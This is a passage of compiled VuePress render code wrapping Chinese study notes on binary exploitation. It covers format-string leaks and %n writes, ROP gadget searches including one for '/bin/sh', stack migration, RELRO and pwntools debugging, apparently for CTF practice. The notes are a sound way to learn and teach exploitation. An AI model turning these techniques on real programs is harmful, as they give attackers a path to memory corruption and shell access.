punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br")])]),n("p",[t._v("正面这个即使保护全开也能拿到 shell")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("while")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("scanf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%s"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("EOF")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br")])]),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("gdb ./echo\nb printf\nr\n输入 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("p",[t._v("TODO gdb 源码调试")]),t._v(" "),n("p",[t._v("fmt 可控")]),t._v(" "),n("p",[t._v("--  Constrains")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("-- fmt 长度很短\n-- 过滤\n")])])]),n("h4",{attrs:{id:"fmt-read"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#fmt-read"}},[t._v("#")]),t._v(" fmt - read")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("int printf( const char* format, ...);")])]),t._v(" "),n("li",[n("p",[t._v("rdi, rsi, rdx, rcx, r8, r9, STACK")]),t._v(" "),n("ul",[n("li",[t._v("x64 calling convention")]),t._v(" "),n("li",[t._v("rdi, rsi, rdx, r10, r8, r9, (push to stack) for system call")]),t._v(" "),n("li",[t._v("return value is stored in rax")])])]),t._v(" "),n("li",[n("p",[t._v("rdi -> fmt")])]),t._v(" "),n("li",[n("p",[t._v("%d, %p, %s, %c, %x -> read data on the stack")])]),t._v(" "),n("li",[n("p",[t._v("information leak")])])]),t._v(" "),n("p",[t._v("正常参数是按顺序放  rdi, rsi, rdx, rcx, r8, r9, STACK的。")]),t._v(" "),n("p",[t._v("实际输入 %x%x 就只是把 format 放到 rdi，那么就会直接读出 stack 上面的内容。就把 stack leak 出来。")]),t._v(" "),n("p",[t._v("能控 formatstring, 从第6个开始就可以从 stack 上一直读了。register内容读完就是 stack 的值了")]),t._v(" "),n("p",[t._v("pintf(buf);")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[t._v("input"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"aaaaaaa"')]),t._v("\noutput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"aaaaaaa"')]),t._v("\n\ninput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%p.%p.%p"')]),t._v("\noutput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x7fbdb0e858b0, 0x1, 0x3"')]),t._v("\n        rdi              rsi  rdx\n\ninput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%3$p"')]),t._v("\noutput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x3"')]),t._v("\n\ninput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%p.%p.%p.%p.%p.%p.%p.%p.%p"')]),t._v("\noutput"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0x7fbdb0e858b0, 0x1, 0x7ffff7dd48b0, 0x555555554846.0x4.0x7052e7052e7025.0x252e70252e70252e"')]),t._v("\n        rdi              rsi  rdx              rcx            r8  r9               stack\n\n已进入main函数了 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("对齐\nx"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("64")]),t._v("gx $rsp"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v("\n\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br")])]),n("p",[t._v("BambooFox-2018-2019年合集-107学年社课 (P2. 程式安全-pwn2)")]),t._v(" "),n("h4",{attrs:{id:"fmt-write"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#fmt-write"}},[t._v("#")]),t._v(" fmt - write")]),t._v(" "),n("p",[t._v("将已输出之字元数目当成interger值（4bytes），写入address。")]),t._v(" "),n("p",[t._v("e.g")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// fmt_write.c")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a = %d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"123abc%d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// printf("%100c%d\\n", 0, a);')]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a = %d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//a = 6")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br")])]),n("p",[t._v('printf("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%n", &ptr)')]),t._v(" "),n("p",[t._v('printf("%100c%n", &char, &ptr)')]),t._v(" "),n("p",[t._v('printf("%100c%n", 0, &ptr)')]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// fmt_write.c")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a = %d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%100c%d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"a = %d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//a=100")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br")])]),n("p",[t._v("16进制显示\n"),n("code",[t._v("./fmt_write.c | xxd")])]),t._v(" "),n("p",[t._v("大量写入不稳定，需要sleep等一下。或使用又下的方法")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("%100c%n -> 写入4bytes \\x64\\x00\\x00\\x00")])]),t._v(" "),n("li",[n("p",[t._v("%100c%hn -> 写入2bytes \\x64\\x00\\")])]),t._v(" "),n("li",[n("p",[t._v("%100c%hhn -> 写入1bytes \\x64")])])]),t._v(" "),n("h4",{attrs:{id:"fmt-exploit"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#fmt-exploit"}},[t._v("#")]),t._v(" fmt - exploit")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("If format string is stored on the stack：")]),t._v(" "),n("ul",[n("li",[t._v("将address放置放payload，得知address位於第n個参数，用%n$去refenrence它。")])])]),t._v(" "),n("li",[n("p",[t._v("%nSp->leak libc，PIE，Heap，Stack:bypass ASLR")])]),t._v(" "),n("li",[n("p",[t._v("%n$n->write value")])]),t._v(" "),n("li",[n("p",[t._v("read &write everywhere")])])]),t._v(" "),n("p",[t._v("如果fomrat string在stack上。那可以把address放在format string上。 用%s leak, format sting后面+个8bytes的printf 的GOT。再算好address位置。")]),t._v(" "),n("p",[t._v("%100c%n%100c%n\n第一个%n会写100，第二个%n会写200，只能从小往大排列好再写。")]),t._v(" "),n("p",[t._v("pwn_02_fmt_write.py")]),t._v(" "),n("p",[t._v("當format string不在stack上，如位於global.bss")]),t._v(" "),n("p",[t._v("無法利用fmt payload來放address")]),t._v(" "),n("p",[t._v("尋找stack上有利残留值")]),t._v(" "),n("p",[t._v("pointer， address")]),t._v(" "),n("ul",[n("li",[n("p",[t._v("libc text")])]),t._v(" "),n("li",[n("p",[t._v("stack")])])]),t._v(" "),n("p",[t._v("通常找到的address固定，只能往同個地方寫，但希望能拆開寫")]),t._v(" "),n("p",[t._v("·希望找到一個stack address ，其指向之地方又是stack address 。")]),t._v(" "),n("p",[t._v("·利用第一個address來改寫第二個address ，用第二個address來建構真的要的address。")]),t._v(" "),n("p",[t._v("√  RBP Chain")]),t._v(" "),n("h3",{attrs:{id:"rop-gadget"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#rop-gadget"}},[t._v("#")]),t._v(" ROP Gadget")]),t._v(" "),n("ul",[n("li",[t._v("Return Oriented Programming")]),t._v(" "),n("li",[t._v("透過不断去執行包含ret的程式片段來達到想要的操作")]),t._v(" "),n("li",[t._v("這些包含ret的程式片段又被稱作gadget")])]),t._v(" "),n("p",[t._v("结尾是ret的程序代码段")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("add rsp, 0x8\nret\n\npop rax\nret\n\nleave\nret\n\n400730: 41 5e   pop r14\n400732: 41 5f   pop r15\n400734: c3      ret\n\nmov rax,rbx\nret\n\nlea rax,[local_8h]\nmov, rdi, rax\nmov eax, 0\ncall sym.imp.gets\nret\n")])])]),n("p",[t._v("每个bytes表示的内容不同, 见下面")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("400730: 41 5e   pop r14\n400732: 41 5f   pop r15\n400734: c3      ret\n\n400731: 5e      pop rsi\n400732: 41 5f   pop r15\n400734: c3      ret\n\n400732: 41 5f   pop r15\n400734: c3      ret\n\n400733: 5f      pop rdi\n400734: c3      ret\n")])])]),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('ROPgadget --binary ./test | grep \'pop rax.*ret\'\nROPgadget --binary ./ret2libc3 --only "pop|ret"\nROPgadget --binary ./ret2libc3 --only "pop|ret" | grep "eax"\nROPgadget --binary ./ret2libc3 --only "pop|ret" | grep "ebx" | grep "ecx" | grep "edx"\nROPgadget --binary ./ret2libc3 --string "/bin/sh"\n')])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("p",[n("img",{attrs:{src:a(603),alt:"Alt text"}})]),t._v(" "),n("p",[t._v("ret2libc, "),n("a",{attrs:{href:"https://blog.csdn.net/qq_40827990/article/details/86662079",target:"_blank",rel:"noopener noreferrer"}},[t._v("Link"),n("OutboundLink")],1)]),t._v(" "),n("p",[n("a",{attrs:{href:"practise/ret2libc1.c"}},[t._v("ret2libc1")]),t._v(" "),n("a",{attrs:{href:"practise/ret2libc2.c"}},[t._v("ret2libc2")]),t._v(" "),n("a",{attrs:{href:"practise/ret2libc3.c"}},[t._v("ret2libc3")])]),t._v(" "),n("h4",{attrs:{id:"rop-chain"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#rop-chain"}},[t._v("#")]),t._v(" ROP Chain")]),t._v(" "),n("p",[n("img",{attrs:{src:a(604),alt:""}}),t._v("\n0x39 execve（执行文件）在父进程中fork一个子进程")]),t._v(" "),n("p",[n("img",{attrs:{src:a(605),alt:""}}),t._v(" "),n("img",{attrs:{src:a(606),alt:""}})]),t._v(" "),n("h3",{attrs:{id:"stack-migration"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#stack-migration"}},[t._v("#")]),t._v(" stack migration")]),t._v(" "),n("ul",[n("li",[t._v("ROP chain")]),t._v(" "),n("li",[t._v("x64 addres -> 8bytes")]),t._v(" "),n("li",[t._v("long return address sled")]),t._v(" "),n("li",[t._v("Not engough memory to prepare ROP chain")])]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v("leave ret gadget\n\nmov rsp， rbp\npop rbp\n\nOverflow fake rbp -> leave ret\nrbp -> fake rbp\nret -> leave ret gadget\n\nleave ret again：\nmov rsp， rbp->將stack搬至fake rbp\npop rbp\nret->跳到新的rop chain\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br")])]),n("ul",[n("li",[t._v("将Stack搬到可存储ROP playload的地方")]),t._v(" "),n("li",[t._v("在有限的情况下，利用stack migration让ROP持续活下去")])]),t._v(" "),n("h3",{attrs:{id:"relo"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#relo"}},[t._v("#")]),t._v(" RELO")]),t._v(" "),n("ul",[n("li",[t._v("Relocation Read-Only")]),t._v(" "),n("li",[t._v("Partial RELRO\n"),n("ul",[n("li",[t._v("GOT可寫")])])]),t._v(" "),n("li",[t._v("Full RELRO\n"),n("ul",[n("li",[t._v("Load time時會將所有function resolve完畢")]),t._v(" "),n("li",[t._v("GOT不可寫")])])])]),t._v(" "),n("h3",{attrs:{id:"uaf原理"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#uaf原理"}},[t._v("#")]),t._v(" UAF原理")]),t._v(" "),n("p",[t._v("https://mp.weixin.qq.com/s/Jg6Usu58LXnHarMsR9Ok8w")]),t._v(" "),n("h3",{attrs:{id:"todo-2"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#todo-2"}},[t._v("#")]),t._v(" TODO")]),t._v(" "),n("p",[t._v("明显的stack/heap/int 溢出, string format,off-by-one/UAF/house of XXX/xxbin attack\n抽象成：对内存地址的读写\n漏洞利用: shellcode/GOT/vtable/hook_function/onegadget")]),t._v(" "),n("h2",{attrs:{id:"常用命令"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#常用命令"}},[t._v("#")]),t._v(" 常用命令")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://blog.csdn.net/weixin_42072280/article/details/90229294",target:"_blank",rel:"noopener noreferrer"}},[t._v("checksec"),n("OutboundLink")],1),t._v(" "),n("code",[t._v("[filename]")])]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("/Downloads/level0'\n    Arch:     amd64-64-little # 64位\n    RELRO:    No RELRO\n    Stack:    No canary found # 程序编译时关了栈不可执行保护\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    # 这说明我们可以在buf里面输入shellcode和填充字符\n    # 并且让函数的返回地址覆盖成buf的栈上地址 来实现栈溢出攻击\n")])])]),n("p",[t._v("通常定义变量时 后面跟 一个bp 大小(8bytes/64位, 4bytes/32位)")]),t._v(" "),n("p",[t._v("ldd filename  通过ldd查找libc共享库")]),t._v(" "),n("h2",{attrs:{id:"pwntools"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#pwntools"}},[t._v("#")]),t._v(" pwntools")]),t._v(" "),n("p",[n("a",{attrs:{href:"https://www.jianshu.com/p/6e528b33e37a",target:"_blank",rel:"noopener noreferrer"}},[t._v("Link"),n("OutboundLink")],1)]),t._v(" "),n("h3",{attrs:{id:"本地启动"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#本地启动"}},[t._v("#")]),t._v(" 本地启动")]),t._v(" "),n("p",[t._v("nc -vc ./fmt -kl 3333")]),t._v(" "),n("p",[t._v("然后其他机器就可以nc ip port连接了")]),t._v(" "),n("h3",{attrs:{id:"怎样调试"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#怎样调试"}},[t._v("#")]),t._v(" 怎样调试")]),t._v(" "),n("p",[t._v("方法1")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("context"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("arch"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'amd64'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" os"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'linux'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" log_level"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nsh "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" process"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'./pwn'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# gdb.attach(sh, 'b *0x1234')")]),t._v("\ngdb"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("attach"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("p",[t._v("方法2")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("sh "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" process"),n("span",{pre:!0,attrs:{class:"token 